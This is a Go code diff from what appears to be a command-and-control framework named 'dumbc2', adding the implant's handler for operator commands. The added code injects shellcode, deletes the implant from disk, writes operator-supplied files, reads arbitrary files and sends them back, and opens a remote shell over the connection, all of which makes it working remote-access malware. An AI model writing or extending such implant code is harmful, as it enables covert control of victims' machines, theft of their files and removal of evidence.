@@ -1,6 +1,8 @@
 package useri
 
 import (
+	"bytes"
+	"crypto/sha256"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -9,6 +11,7 @@ import (
 	"github.com/kmahyyg/dumbc2/config"
 	"github.com/kmahyyg/dumbc2/remoteop"
 	"github.com/kmahyyg/dumbc2/transport"
+	"io/ioutil"
 	"log"
 	"net"
 	"os"
@@ -68,7 +71,6 @@ func respond2Cmd(curConn net.Conn) error {
 	}()
 	for {
 		var ccmd *remoteop.CmdMsg
-		var resp *remoteop.CmdMsg
 		smbuf := make([]byte, 1300)
 		// the single control message cannot be more than 1300 bytes
 		// so read once
@@ -90,11 +92,107 @@ func respond2Cmd(curConn net.Conn) error {
 		} else {
 			switch ccmd.Cmd {
 			case remoteop.CommandBOOM:
+				remoteop.DeleteMyself()
+				_, err := ctrlstem.Write(successResp(ccmd))
+				if err != nil {
+					log.Println(err)
+					continue
+				}
 			case remoteop.CommandINJE:
+				remoteop.InjectShellcode(ccmd.Msg)
+				_, err := ctrlstem.Write(successResp(ccmd))
+				if err != nil {
+					log.Println(err)
+					continue
+				}
 			case remoteop.CommandUPLD:
+				err := ioutil.WriteFile(ccmd.Msg, []byte{0x1}, 0644)
+				if err != nil {
+					_, _ = ctrlstem.Write(failedResp(ccmd, remoteop.StatusFAILED, err))
+					log.Println(err)
+					continue
+				}
+				_, err = ctrlstem.Write(successResp(ccmd))
+				if err != nil {
+					log.Println(err)
+					continue
+				}
+				datastem, err := ymcli.Open()
+				if err != nil {
+					log.Println(err)
+					continue
+				}
+				var buf bytes.Buffer
+				for ; buf.Len() < ccmd.NextSize; {
+					smbuf := make([]byte, 1300)
+					readint, err := datastem.Read(smbuf)
+					if err != nil || readint == 0 {
+						log.Println(err)
+						_ = datastem.Close()
+						break
+					}
+					buf.Write(smbuf)
+				}
+				_ = datastem.Close()
+				err = ioutil.WriteFile(ccmd.Msg, buf.Bytes(), 0644)
+				if err != nil {
+					log.Println(err)
+					continue
+				}
+				if ccmd.NextBinHash != fmt.Sprintf("%x", sha256.Sum256(buf.Bytes())) {
+					log.Println("** NOTE: THE DATA TRANSFERED MIGHT CORRUPTED, PLEASE VERIFY. **")
+				}
 			case remoteop.CommandDWLD:
+				fddata, err := ioutil.ReadFile(ccmd.Msg)
+				if err != nil {
+					_, _ = ctrlstem.Write(failedResp(ccmd, remoteop.StatusNEXISTS, err))
+					log.Println(err)
+					continue
+				}
+				nextFileInfoResp := &remoteop.CmdMsg{
+					Status:      remoteop.StatusOK,
+					Cmd:         ccmd.Cmd,
+					Msg:         "success",
+					HasNext:     true,
+					NextIsBin:   true,
+					NextSize:    len(fddata),
+					NextBinHash: fmt.Sprintf("%x", sha256.Sum256(fddata)),
+				}
+				nextFileInfoJResp, err := json.Marshal(nextFileInfoResp)
+				if err != nil {
+					log.Println(err)
+					continue
+				}
+				_, err = ctrlstem.Write(nextFileInfoJResp)
+				if err != nil {
+					log.Println(err)
+					continue
+				}
+				datastem, err := ymcli.Open()
+				if err != nil {
+					log.Println(err)
+					continue
+				}
+				_, err = datastem.Write(fddata)
+				if err != nil {
+					_ = datastem.Close()
+					log.Println(err)
+					continue
+				}
+				_ = datastem.Close()
 			case remoteop.CommandBASH:
-
+				_, err := ctrlstem.Write(successResp(ccmd))
+				if err != nil {
+					log.Println(err)
+					continue
+				}
+				datastem, err := ymcli.Open()
+				if err != nil {
+					_, _ = ctrlstem.Write(failedResp(ccmd, remoteop.StatusFAILED, err))
+				}
+				remoteop.GetShell(datastem)
+				_ = datastem.Close()
+				continue
 			default:
 				log.Fatalln("Internal error.")
 			}
@@ -103,8 +201,8 @@ func respond2Cmd(curConn net.Conn) error {
 	return nil
 }
 
-func successResp(req *remoteop.CmdMsg) (resp *remoteop.CmdMsg) {
-	resp = &remoteop.CmdMsg{
+func successResp(req *remoteop.CmdMsg) []byte {
+	resp := &remoteop.CmdMsg{
 		Status:      remoteop.StatusOK,
 		Cmd:         req.Cmd,
 		Msg:         "success",
@@ -113,11 +211,15 @@ func successResp(req *remoteop.CmdMsg) (resp *remoteop.CmdMsg) {
 		NextSize:    0,
 		NextBinHash: "",
 	}
-	return
+	jresp, err := json.Marshal(resp)
+	if err != nil {
+		log.Fatalln("Internal Error.")
+	}
+	return jresp
 }
 
-func failedResp(req *remoteop.CmdMsg, status int, err error) (resp *remoteop.CmdMsg) {
-	resp = &remoteop.CmdMsg{
+func failedResp(req *remoteop.CmdMsg, status int, err error) []byte {
+	resp := &remoteop.CmdMsg{
 		Status:      status,
 		Cmd:         req.Cmd,
 		Msg:         fmt.Sprintf("%s", err),
@@ -126,5 +228,9 @@ func failedResp(req *remoteop.CmdMsg, status int, err error) (resp *remoteop.Cmd
 		NextSize:    0,
 		NextBinHash: "",
 	}
-	return
+	jresp, err := json.Marshal(resp)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	return jresp
 }
